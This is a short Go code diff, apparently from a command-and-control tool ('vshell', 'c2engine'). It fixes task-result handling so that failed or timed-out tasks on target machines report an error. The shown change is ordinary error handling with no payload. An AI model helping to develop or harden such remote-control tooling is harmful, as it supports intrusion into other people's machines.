@@ -5,6 +5,7 @@ package controllers
 
 import (
 	"fmt"
+	"strings"
 	"time"
 
 	"vshell/c2engine"
@@ -33,8 +34,16 @@ func waitTaskResult(taskID int64, timeout time.Duration) (string, error) {
 			return "", fmt.Errorf("task %d disappeared", taskID)
 		}
 		switch task.Status {
-		case "completed", "failed", "timeout":
+		case "completed":
 			return task.Result, nil
+		case "failed", "timeout":
+			// 之前这里把 failed 也当成功返回，导致"面板说成功、目标机没变化"。
+			// agent 把错误文本放在 Result 里（形如 "ERROR: ..."），原样回给调用方。
+			msg := strings.TrimSpace(task.Result)
+			if msg == "" {
+				msg = "task " + task.Status
+			}
+			return "", fmt.Errorf("%s", msg)
 		}
 		time.Sleep(50 * time.Millisecond)
 	}
